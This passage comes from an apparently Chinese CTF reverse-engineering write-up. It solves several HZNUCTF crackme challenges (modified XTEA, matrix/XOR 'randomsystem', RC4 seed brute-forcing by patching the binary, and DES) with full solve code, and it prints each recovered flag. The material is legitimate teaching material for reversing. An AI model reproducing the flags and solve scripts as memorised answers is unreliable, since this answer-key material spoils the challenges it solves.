Enc[17] + 10 * Enc[18] + 69 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 2 * Enc[22]) + 23 * Enc[23] == 159029)\ns.add((((520 * Enc[0] - 222 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 56655 * Enc[4]) + 6666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 73 * Enc[11] + 1007 * Enc[12] + 7777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 99999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24] == 2762025)\ns.add(((((1323 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 660 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 9999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] == 1551621)\ns.add((((((777 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + 65 * Enc[16] + 90 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 999 * Enc[20] + 21 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26] == 948348)\ns.add(((((((97 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 56 * Enc[4]) + 96 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 90 * Enc[17] + -2 * Enc[18] + 609 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 2 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] == 777044)\ns.add((((((177 * Enc[0] - 22 * Enc[1]) + 699 * Enc[2] + 64 * Enc[3] - 56 * Enc[4] - 96 * Enc[5] - 66 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 69 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] - 28 * Enc[28] == 185016)\ns.add(((((((77 * Enc[0] - 2 * Enc[1]) + 6 * Enc[2] + 6 * Enc[3] - 96 * Enc[4] - 9 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 0 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 9 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 26 * Enc[25] - -58 * Enc[26]) + 27 * Enc[27] - 2 * Enc[28]) + 29 * Enc[29] == 130106)\n\nfor x in Enc:\n    s.add(x >= 32)\n    s.add(x <= 126)\n\nif s.check() == sat:\n    m = s.model()\n\n    solution = [m[x].as_long() if m[x] is not None else 0 for x in Enc]\n    \n    decrypted = decrypt(solution)\n    print(decrypted)\n    \nelse:\n    print(\"No solution found\")\n```\n\nHZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}\n\n### XTEA\n\n初始化置种子srand了一次，然后这边里面判断是否有调试，然后又srand了一遍，可以忽略，种子就是0x7E8。\n\n红框处是将输入字符串四个四个一组进行翻转。\n\n![img](/images/1744633170177-8.png)\n\nInitKey函数是用rand初始化了四个整数Key。\n\n![img](/images/1744633170177-9.png)\n\nXTea是魔改的，Delta是靠用户输入传进来的，那么这边Delta未知就需要爆破。\n\n![img](/images/1744633170177-10.png)\n\n题目描述说有点misc味，发现附件中还有个readme里面的压缩包密码就是标准Delta，**2654435769 -> 0x9E3779B9**\n\n直接编写解密，使用该Delta就可以解出flag。\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\nunsigned int *__fastcall dec(int a1, unsigned int *a2, unsigned int *a3, unsigned int a4)\n{\n    unsigned int *result; // rax\n    unsigned int v5;      // [rsp+24h] [rbp+4h]\n    unsigned int v6;      // [rsp+44h] [rbp+24h]\n    unsigned int v7;      // [rsp+64h] [rbp+44h]\n    int i;                // [rsp+84h] [rbp+64h]\n\n    v5 = *a2;\n    v6 = *a3;\n    v7 = 0;\n    v7 = -a1 * 32;\n    for (i = 0; i < 32; ++i)\n    {\n        v6 -= (*(DWORD *)(a4 + 4LL * ((v7 >> 11) & 3)) + v7) ^ (v5 + ((v5 >> 5) ^ (16 * v5)));\n        v7 += a1;\n        v5 -= (*(DWORD *)(a4 + 4LL * (v7 & 3)) + v7) ^ (v6 + ((v6 >> 5) ^ (16 * v6)));\n    }\n    *a2 = v5;\n    result = a3;\n    *a3 = v6;\n    return result;\n}\n\nint main()\n{\n    unsigned char buffer[] = {\n        0x24, 0x23, 0xCB, 0x8C, 0x1A, 0x74, 0xA7, 0x09,\n        0x8D, 0x67, 0x3C, 0xFB, 0x79, 0x3A, 0x08, 0xF6,\n        0x1B, 0x24, 0xCC, 0xF1, 0xF2, 0x59, 0xFA, 0x39,\n        0xCC, 0xE1, 0xAB, 0xF2, 0x72, 0x9F, 0x18, 0x17};\n    srand(0x7e8);\n    // 初始化Key\n    uint32_t key[4]{};\n    for (int i = 0; i < 4; i++)\n        key[i] = rand();\n\n    for (int j = 7; j > 0; j--)\n        dec(0x9E3779B9, (unsigned int *)(buffer + (j - 1) * 4), (unsigned int *)(buffer + j * 4), (uint32_t)key);\n\n    // 四个字节一组进行翻转\n    for (int j = 0; j < 32; j += 4)\n    {\n        auto tmp = *((char *)buffer + j + 3) | (*((char *)buffer + j + 2) << 8) | (*((char *)buffer + j + 1) << 16) | (*((char *)buffer + j) << 24);\n        *(int *)(buffer + j) = tmp;\n    }\n    printf(\"%.32s\\n\", buffer);\n\n    return 0;\n}\n```\n\nHZNUCTF{ae6-9f57-4b74-b423-98eb}\n\n### randomsystem\n\n第一部分是输入64字节大小的0101二进制数据，然后进行转换到Hex（倒序），再倒序回来拆分半个字节转到ascii字符。\n\n如：0101001001100101第一次函数后是0x65，0x52然后再翻转拆分为ascii字符'5','2','6','5'。\n\n![img](/images/1744633170177-11.png)\n\n根据判断判断出的字符可知要输入的是52 65 56 65 52 65 53 65的二进制数据。\n\n```\n0101001001100101010101100110010101010010011001010101001101100101\n```\n\n底下的一些加密函数里面有花指令，是基础花指令，这边不做多赘述。\n\n第一部分用固定种子的随机数初始化了一个v18数值列表。\n\n![img](/images/1744633170177-12.png)\n\n然后进行四次加密。\n\n![img](/images/1744633170177-13.png)\n\nEnc1是用随机数初始化的列表进行打乱输入字符串的顺序。\n\n![img](/images/1744633170177-14.png)\n\nEnc2是将输入字符串转存到另一个二维数组。\n\n![img](/images/1744633170177-15.png)\n\n第三个函数是将之前输入转换后的Key存到\"Str\"中，实际值就是**ReVeReSe**\n\n第四个函数是用一个全局的矩阵乘上输入数据。\n\n![img](/images/1744633170178-16.png)\n\n最后和Key进行循环异或加密。\n\n![img](/images/1744633170178-17.png)\n\n所以解密流程就是这几步的翻转，需要先计算出全局矩阵数据的逆矩阵，这一步用在线网站就可以解得。\n\nEnc1由于是对称的可以直接用原函数，Enc3也可以直接用原函数把矩阵数据改成逆矩阵就是解密。\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\nvoid Enc1(char *Str, int *RdList)\n{\n    char v3;   // [esp+D3h] [ebp-1Dh]\n    size_t i;  // [esp+DCh] [ebp-14h]\n    size_t v5; // [esp+E8h] [ebp-8h]\n\n    v5 = 64;\n    for (i = 0;; ++i)\n    {\n        auto result = v5 >> 1;\n        if (i >= v5 >> 1)\n            break;\n        if (RdList[i] >= 0 && RdList[i] < v5)\n        {\n            v3 = Str[i];\n            Str[i] = Str[v5 - RdList[i] - 1];\n            Str[v5 - RdList[i] - 1] = v3;\n        }\n    }\n}\n\nvoid Enc2(char *a1, char *a2)\n{\n    int j;  // [esp+D0h] [ebp-20h]\n    int i;  // [esp+DCh] [ebp-14h]\n    int v4; // [esp+E8h] [ebp-8h]\n\n    v4 = 0;\n    for (i = 0; i < 8; ++i)\n    {\n        for (j = 0; j < 8; ++j)\n            *&a1[32 * i + 4 * j] = a2[v4++];\n    }\n}\n\nunsigned int dword_3FC368[] = {\n    0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000,\n    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n    0x00000000, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000001, 0x00000001, 0x00000000,\n    0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n    0x00000000, 0x00000001, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001, 0x00000000,\n    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n    0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001, 0x00000001,\n    0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000001};\n\nint inv[] = {\n    1,-4,1,-2,0,5,-2,3,\n    0,3,-1,1,0,-3,1,-2,\n    0,-2,1,-1,0,2,-1,2,\n    0,0,0,1,0,-1,0,0,\n    0,-4,1,-1,1,4,-2,3,\n    0,1,0,0,0,0,0,-1,\n    0,1,0,0,0,-1,1,-1,\n    0,-1,0,0,0,1,0,1,\n};\n\nint Enc3(int *a1, char *a2, char *a3)\n{\n    int result; // eax\n    int k;      // [esp+D0h] [ebp-20h]\n    int j;      // [esp+DCh] [ebp-14h]\n    int i;      // [esp+E8h] [ebp-8h]\n\n    for (i = 0; i < 8; ++i)\n    {\n        for (j = 0; j < 8; ++j)\n        {\n            a3[32 * i + 4 * j] = 0;\n            for (k = 0; k < 8; ++k)\n                a3[32 * i + 4 * j] += *&a2[32 * k + 4 * j] * a1[8 * i + k];\n        }\n        result = i + 1;\n    }\n    return result;\n}\n\nvoid Dec2(char *a1, char *a2)\n{\n    int j;\n    int i;\n    int v4;\n\n    v4 = 0;\n    for (i = 0; i < 8; ++i)\n    {\n        for (j = 0; j < 8; ++j)\n            a2[v4++] = a1[32 * i + 4 * j];\n    }\n}\n\nunsigned char EncFlag[256] = {\n    0x78, 0x01, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0xA9, 0x00, 0x00, 0x00, 0xF5, 0x01, 0x00, 0x00,\n    0x15, 0x01, 0x00, 0x00, 0x49, 0x01, 0x00, 0x00, 0x8B, 0x00, 0x00, 0x00, 0x56, 0x01, 0x00, 0x00,\n    0x7C, 0x01, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x00,\n    0x7D, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00, 0x5B, 0x01, 0x00, 0x00, 0x33, 0x01, 0x00, 0x00,\n    0x07, 0x01, 0x00, 0x00, 0x67, 0x01, 0x00, 0x00, 0xA2, 0x00, 0x00, 0x00, 0xE4, 0x01, 0x00, 0x00,\n    0x36, 0x01, 0x00, 0x00, 0x4D, 0x01, 0x00, 0x00, 0x5A, 0x01, 0x00, 0x00, 0x53, 0x01, 0x00, 0x00,\n    0x96, 0x00, 0x00, 0x00, 0xC2, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00, 0x58, 0x01, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0xFA, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0xAF, 0x00, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0xAD, 0x00, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00, 0x7B, 0x01, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0x24, 0x01, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x6D, 0x01, 0x00, 0x00,\n    0xC5, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xC5, 0x00, 0x00, 0x00, 0xA1, 0x00, 0x00, 0x00,\n    0xC6, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x00, 0xCF, 0x00, 0x00, 0x00, 0xF4, 0x00, 0x00, 0x00,\n    0xCA, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0xCC, 0x00, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00,\n    0xC1, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,\n    0x9E, 0x00, 0x00, 0x00, 0xB5, 0x00, 0x00, 0x00, 0x91, 0x00, 0x00, 0x00, 0x61, 0x01, 0x00, 0x00,\n    0x99, 0x00, 0x00, 0x00, 0x65, 0x01, 0x00, 0x00, 0xF6, 0x00, 0x00, 0x00, 0x97, 0x00, 0x00, 0x00};\n\nint main()\n{\n    // First: 0101001001100101010101100110010101010010011001010101001101100101\n    srand(2025);\n    int RdList[0x80]{};\n    bool v16 = true;\n    int rd{};\n    for (int i = 0; i < 32; i++)\n    {\n        do\n        {\n            rd = rand() % 32;\n            rd &= 0x8000001F;\n            v16 = 1;\n            for (int j = 0; j < i; j++)\n            {\n                if (RdList[j] == rd)\n                {\n                    v16 = 0;\n                    break;\n                }\n            }\n        } while (!v16);\n        RdList[i] = rd;\n    }\n\n    char Key[] = \"ReVeReSe\";\n    int count = 0;\n    for (int i = 0; i < 256; i += 4)\n    {\n        *(DWORD *)(EncFlag + i) ^= Key[count % 8];\n        count++;\n    }\n    unsigned char Buffer_Dec[256]{};\n\n    Enc3((int *)inv, (char *)EncFlag, (char *)Buffer_Dec);\n    Dec2((char *)Buffer_Dec, (char *)Buffer_Dec);\n    Enc1((char *)Buffer_Dec, RdList);\n\n    printf(\"HZNUCTF{%.64s}\\n\", Buffer_Dec);\n    return 0;\n}\n```\n\nHZNUCTF{3zfb899ac5c256d-7a8r59f0tccd-4fa6b8vfd111-a44ffy4r0-6dce5679da58}\n\n### conforand（非预期）\n\n从srand查看交叉调用，发现是当前时间戳随机，并非伪随机。\n\n![img](/images/1744633170178-18.png)\n\n![img](/images/1744633170178-19.png)\n\n查看rand交叉调用，发现是再init_sbox函数中调用，并且只获取了一次随机数，应该是利用rand的数值参与sbox生成。\n\n![img](/images/1744633170178-20.png)\n\n那么这边的思路就是爆破随机数，但由于是ollvm编译的，代码混乱，使用d810去混淆后也是很混乱，这边就直接不分析加密代码，采取黑盒爆破手段。\n\n接下来是先检验加密对称性，运行发现是会输出加密后的内容。\n\n检验步骤：\n\n1. 随便输入一串字符串\n2. 断点rand，修改rand返回值rax寄存器为0。\n3. 得到输出加密内容。\n4. 再次输入字符串，断点在main的rc4调用处，将传参的字符串patch为刚刚程序输出的加密后字节数据。\n5. 断点rand，修改rand返回值rax寄存器为0。\n6. 观察输出加密内容是否为原字符串数据。\n\nPatch前：\n\n![img](/images/1744633170178-21.png)\n\nPatch后：\n\n![img](/images/1744633170178-22.png)\n\n发现是对称的，同一个rand值，加密函数也可以用于解密。\n\n![img](/images/1744633170178-23.png)\n\n![img](/images/1744633170178-24.png)\n\n开始Patch原程序流程，用于爆破，将init函数作为hook跳转函数。\n\n将rand调用改成jmp到init函数。\n\n![img](/images/1744633170178-25.png)\n\ninit函数头直接改成如下，将0x4068D3地址的数值存到eax，然后再跳转回去，达到一个hook修改rand值结果的效果，所以我们直接加载elf通过修改0x4068D3数值，调用rc4加密来爆破解密密文。\n\n![img](/images/1744633170178-26.png)\n\n这边使用这个库加载elf进行调用call：https://github.com/IchildYu/load-elf （河豚鱼，神）\n\n爆破代码（Key是在原init函数中进行初始化的明文，可以直接找到）：\n\n```cpp\n#include <stdio.h>\n#include <stdlib.h>\n#include \"include/load_elf.h\"\n#include \"include/logger.h\"\n#include \"include/breakpoint.h\"\n\nint main() \n{\n        const char* path = \"./conforand\";\n        void* base = load_elf(path);\n\n        __uint64_t  (*rc4)(unsigned char*, unsigned long long, unsigned char*, unsigned long long) = get_symbol_by_offset(base,0x413170);\n\n        unsigned char key[]=\"JustDoIt!\";\n\n        for(int i=0; i<1000000; i++)\n        {\n                unsigned char EncData[]={0x83,0x1e,0x9c,0x48,0x7a,0xfa,0xe8,0x88,0x36,0xd5,0x0a,0x08,0xf6,0xa7,0x70,0x0f,0xfd,0x67,0xdd,0xd4,0x3c,0xa7,0xed,0x8d,0x51,0x10,0xce,0x6a,0x9e,0x56,0x57,0x83,0x56,0xe7,0x67,0x9a,0x67,0x22,0x24,0x6e,0xcd,0x2f};\n\n                *(unsigned int*)(0x4068D3) = i;\n\n                rc4(EncData,42,key,9);\n                \n                if(EncData[0] == 'H' \n                        && EncData[1] == 'Z'\n                        && EncData[2] == 'N')\n                {\n                        printf(\"Seed:%d\\n\",i);\n                        printf(\"%.42s\\n\",EncData);\n                        break;\n                }\n        }\n        return 0;\n}\n```\n\n![img](/images/1744633170178-27.png)\n\nHZNUCTF{489b88-1305-411e-b1f4-88a3070a73}\n\n### exchange\n\n输入的字符串经过unhex、拆分字节，改变顺序。\n\n如：**11**->**0x31 0x31**->**'3' '1' '3' '1'**->**'3' '3' '1' '1'**\n\n是两个字节为一组进行变换的。\n\n然后调用了加密函数，第一个参数传入变换后的输入，第二个参数是**\"HZNUCTF{\"**字串。\n\n![img](/images/1744633170178-28.png)\n\n主加密函数，发现只走这上面的部分。\n\n![img](/images/1744633170178-29.png)\n\n第一个函数是用**\"HZNUCTF{\"**字串生成的一串数据，64个整数数据。\n\n第二个函数是将输入数据8个字节为一组进行加密。\n\n加密流程：\n\n1. 4个字节为一组进行翻转\n2. 8字节加密\n3. 4个字节为一组进行翻转\n\n![img](/images/1744633170178-30.png)\n\n加密可以看出是DES加密算法，是对称的，key就是刚刚生成的64个整数数值的前32个，那么可以知道后32个就是解密用的key，直接copy该函数，解密时用生成的后32个整数key即可解密。\n\n![img](/images/1744633170178-31.png)\n\n解密代码：\n\n```cpp\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <time.h>\n\nunsigned int s1[64] = {\n    0x01010400, 0x00000000, 0x00010000, 0x01010404, 0x01010004, 0x00010404, 0x00000004, 0x00010000,\n    0x00000400, 0x01010400, 0x01010404, 0x00000400, 0x01000404, 0x01010004, 0x01000000, 0x00000004,\n    0x00000404, 0x01000400, 0x01000400, 0x00010400, 0x00010400, 0x01010000, 0x01010000, 0x01000404,\n    0x00010004, 0x01000004, 0x01000004, 0x00010004, 0x00000000, 0x00000404, 0x00010404, 0x01000000,\n    0x00010000, 0x01010404, 0x00000004, 0x01010000, 0x01010400, 0x01000000, 0x01000000, 0x00000400,\n    0x01010004, 0x00010000, 0x00010400, 0x01000004, 0x00000400, 0x00000004, 0x01000404, 0x00010404,\n    0x01010404, 0x00010004, 0x01010000, 0x01000404, 0x01000004, 0x00000404, 0x00010404, 0x01010400,\n    0x00000404, 0x01000400, 0x01000400, 0x00000000, 0x00010004, 0x00010400, 0x00000000, 0x01010004};\nunsigned int s2[64] = {\n    0x80108020, 0x80008000, 0x00008000, 0x00108020, 0x00100000, 0x00000020, 0x80100020, 0x80008020,\n    0x80000020, 0x80108020, 0x80108000, 0x80000000, 0x80008000, 0x00100000, 0x00000020, 0x80100020,\n    0x00108000, 0x00100020, 0x80008020, 0x00000000, 0x80000000, 0x00008000, 0x00108020, 0x80100000,\n    0x00100020, 0x80000020, 0x00000000, 0x00108000, 0x00008020, 0x80108000, 0x80100000, 0x00008020,\n    0x00000000, 0x00108020, 0x80100020, 0x00100000, 0x80008020, 0x80100000, 0x80108000, 0x00008000,\n    0x80100000, 0x80008000, 0x00000020, 0x80108020, 0x00108020, 0x00000020, 0x00008000, 0x80000000,\n    0x00008020, 0x80108000, 0x00100000, 0x80000020, 0x00100020, 0x80008020, 0x80000020, 0x00100020,\n    0x00108000, 0x00000000, 0x80008000, 0x00008020, 0x80000000, 0x80100020, 0x80108020, 0x00108000};\nunsigned int s3[64] = {\n    0x00000208, 0x08020200, 0x00000000, 0x08020008, 0x08000200, 0x00000000, 0x00020208, 0x08000200,\n    0x00020008, 0x08000008, 0x08000008, 0x00020000, 0x08020208, 0x00020008, 0x08020000, 0x00000208,\n    0x08000000, 0x00000008, 0x08020200, 0x00000200, 0x00020200, 0x08020000, 0x08020008, 0x00020208,\n    0x08000208, 0x00020200, 0x00020000, 0x08000208, 0x00000008, 0x08020208, 0x00000200, 0x08000000,\n    0x08020200, 0x08000000, 0x00020008, 0x00000208, 0x00020000, 0x08020200, 0x08000200, 0x00000000,\n    0x00000200, 0x00020008, 0x08020208, 0x08000200, 0x08000008, 0x00000200, 0x00000000, 0x08020008,\n    0x08000208, 0x00020000, 0x08000000, 0x08020208, 0x00000008, 0x00020208, 0x00020200, 0x08000008,\n    0x08020000, 0x08000208, 0x00000208, 0x08020000, 0x00020208, 0x00000008, 0x08020008, 0x00020200};\nunsigned int s4[64] = {\n    0x00802001, 0x00002081, 0x00002081, 0x00000080, 0x00802080, 0x00800081, 0x00800001, 0x00002001,\n    0x00000000, 0x00802000, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00800080, 0x00800001,\n    0x00000001, 0x00002000, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002001, 0x00002080,\n    0x00800081, 0x00000001, 0x00002080, 0x00800080, 0x00002000, 0x00802080, 0x00802081, 0x00000081,\n    0x00800080, 0x00800001, 0x00802000, 0x00802081, 0x00000081, 0x00000000, 0x00000000, 0x00802000,\n    0x00002080, 0x00800080, 0x00800081, 0x00000001, 0x00802001, 0x00002081, 0x00002081, 0x00000080,\n    0x00802081, 0x00000081, 0x00000001, 0x00002000, 0x00800001, 0x00002001, 0x00802080, 0x00800081,\n    0x00002001, 0x00002080, 0x00800000, 0x00802001, 0x00000080, 0x00800000, 0x00002000, 0x00802080};\nunsigned int s5[64] = {\n    0x00000100, 0x02080100, 0x02080000, 0x42000100, 0x00080000, 0x00000100, 0x40000000, 0x02080000,\n    0x40080100, 0x00080000, 0x02000100, 0x40080100, 0x42000100, 0x42080000, 0x00080100, 0x40000000,\n    0x02000000, 0x40080000, 0x40080000, 0x00000000, 0x40000100, 0x42080100, 0x42080100, 0x02000100,\n    0x42080000, 0x40000100, 0x00000000, 0x42000000, 0x02080100, 0x02000000, 0x42000000, 0x00080100,\n    0x00080000, 0x42000100, 0x00000100, 0x02000000, 0x40000000, 0x02080000, 0x42000100, 0x40080100,\n    0x02000100, 0x40000000, 0x42080000, 0x02080100, 0x40080100, 0x00000100, 0x02000000, 0x42080000,\n    0x42080100, 0x00080100, 0x42000000, 0x42080100, 0x02080000, 0x00000000, 0x40080000, 0x42000000,\n    0x00080100, 0x02000100, 0x40000100, 0x00080000, 0x00000000, 0x40080000, 0x02080100, 0x40000100};\nunsigned int s6[64] = {\n    0x20000010, 0x20400000, 0x00004000, 0x20404010, 0x20400000, 0x00000010, 0x20404010, 0x00400000,\n    0x20004000, 0x00404010, 0x00400000, 0x20000010, 0x00400010, 0x20004000, 0x20000000, 0x00004010,\n    0x00000000, 0x00400010, 0x20004010, 0x00004000, 0x00404000, 0x20004010, 0x00000010, 0x20400010,\n    0x20400010, 0x00000000, 0x00404010, 0x20404000, 0x00004010, 0x00404000, 0x20404000, 0x20000000,\n    0x20004000, 0x00000010, 0x20400010, 0x00404000, 0x20404010, 0x00400000, 0x00004010, 0x20000010,\n    0x00400000, 0x20004000, 0x20000000, 0x00004010, 0x20000010, 0x20404010, 0x00404000, 0x20400000,\n    0x00404010, 0x20404000, 0x00000000, 0x20400010, 0x00000010, 0x00004000, 0x20400000, 0x00404010,\n    0x00004000, 0x00400010, 0x20004010, 0x00000000, 0x20404000, 0x20000000, 0x00400010, 0x20004010};\nunsigned int s7[64] = {\n    0x00200000, 0x04200002, 0x04000802, 0x00000000, 0x00000800, 0x04000802, 0x00200802, 0x04200800,\n    0x04200802, 0x00200000, 0x00000000, 0x04000002, 0x00000002, 0x04000000, 0x04200002, 0x00000802,\n    0x04000800, 0x00200802, 0x00200002, 0x04000800, 0x04000002, 0x04200000, 0x04200800, 0x00200002,\n    0x04200000, 0x00000800, 0x00000802, 0x04200802, 0x00200800, 0x00000002, 0x04000000, 0x00200800,\n    0x04000000, 0x00200800, 0x00200000, 0x04000802, 0x04000802, 0x04200002, 0x04200002, 0x00000002,\n    0x00200002, 0x04000000, 0x04000800, 0x00200000, 0x04200800, 0x00000802, 0x00200802, 0x04200800,\n    0x00000802, 0x04000002, 0x04200802, 0x04200000, 0x00200800, 0x00000000, 0x00000002, 0x04200802,\n    0x00000000, 0x00200802, 0x04200000, 0x00000800, 0x04000002, 0x04000800, 0x00000800, 0x00200002};\nunsigned int s8[64] = {\n    0x10001040, 0x00001000, 0x00040000, 0x10041040, 0x10000000, 0x10001040, 0x00000040, 0x10000000,\n    0x00040040, 0x10040000, 0x10041040, 0x00041000, 0x10041000, 0x00041040, 0x00001000, 0x00000040,\n    0x10040000, 0x10000040, 0x10001000, 0x00001040, 0x00041000, 0x00040040, 0x10040040, 0x10041000,\n    0x00001040, 0x00000000, 0x00000000, 0x10040040, 0x10000040, 0x10001000, 0x00041040, 0x00040000,\n    0x00041040, 0x00040000, 0x10041000, 0x00001000, 0x00000040, 0x10040040, 0x00001000, 0x00041040,\n    0x10001000, 0x00000040, 0x10000040, 0x10040000, 0x10040040, 0x10000000, 0x00040000, 0x10001040,\n    0x00000000, 0x10041040, 0x00040040, 0x10000040, 0x10040000, 0x10001000, 0x10001040, 0x00000000,\n    0x10041040, 0x00041000, 0x00041000, 0x00001040, 0x00001040, 0x00040040, 0x10000000, 0x10041000};\nunsigned short word_7FF65FC70900[8] = {\n    0x0080, 0x0040, 0x0020, 0x0010, 0x0008, 0x0004, 0x0002, 0x0001};\n\nunsigned int dword_7FF65FC70910[24] = {\n    0x00800000, 0x00400000, 0x00200000, 0x00100000, 0x00080000, 0x00040000, 0x00020000, 0x00010000,\n    0x00008000, 0x00004000, 0x00002000, 0x00001000, 0x00000800, 0x00000400, 0x00000200, 0x00000100,\n    0x00000080, 0x00000040, 0x00000020, 0x00000010, 0x00000008, 0x00000004, 0x00000002, 0x00000001};\nunsigned char byte_7FF65FC70970[56] = {\n    0x38, 0x30, 0x28, 0x20, 0x18, 0x10, 0x08, 0x00, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01,\n    0x3A, 0x32, 0x2A, 0x22, 0x1A, 0x12, 0x0A, 0x02, 0x3B, 0x33, 0x2B, 0x23, 0x3E, 0x36, 0x2E, 0x26,\n    0x1E, 0x16, 0x0E, 0x06, 0x3D, 0x35, 0x2D, 0x25, 0x1D, 0x15, 0x0D, 0x05, 0x3C, 0x34, 0x2C, 0x24,\n    0x1C, 0x14, 0x0C, 0x04, 0x1B, 0x13, 0x0B, 0x03};\nunsigned char byte_7FF65FC709A8[16] = {\n    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10};\n\nvoid __fastcall des_encrypt(unsigned int *a1, DWORD *a2)\n{\n    unsigned int left = a1[1];\n    unsigned int right = a1[0];\n\n    unsigned int temp = (left ^ (right >> 4)) & 0xF0F0F0F;\n    left = temp ^ left;\n    right = (temp << 4) ^ right;\n\n    temp = (left ^ (right >> 16)) & 0x0000FFFF;\n    left = temp ^ left;\n    right = (temp << 16) ^ right;\n\n    temp = (right ^ (left >> 2)) & 0x33333333;\n    right = temp ^ right;\n    left = (temp << 2) ^ left;\n\n    temp = (right ^ (left >> 8)) & 0x00FF00FF;\n    right = temp ^ right;\n    left = (((temp << 8) ^ left) >> 31) | (2 * ((temp << 8) ^ left));\n\n    temp = (left ^ right) & 0xAAAAAAAA;\n    left = temp ^ left;\n    right = ((temp ^ right) >> 31) | (2 * (temp ^ right));\n\n    for (int i = 0; i < 8; i++)\n    {\n        temp = *a2++ ^ ((left >> 4) | (left << 28));\n        unsigned int result1 = s1[(temp >> 24) & 0x3F] |\n                               s3[(temp >> 16) & 0x3F] |\n                               s5[(temp >> 8) & 0x3F] |\n                               s7[temp & 0x3F];\n        temp = *a2++ ^ left;\n\n        right ^= s2[(temp >> 24) & 0x3F] |\n                 s4[(temp >> 16) & 0x3F] |\n                 s6[(temp >> 8) & 0x3F] |\n                 s8[temp & 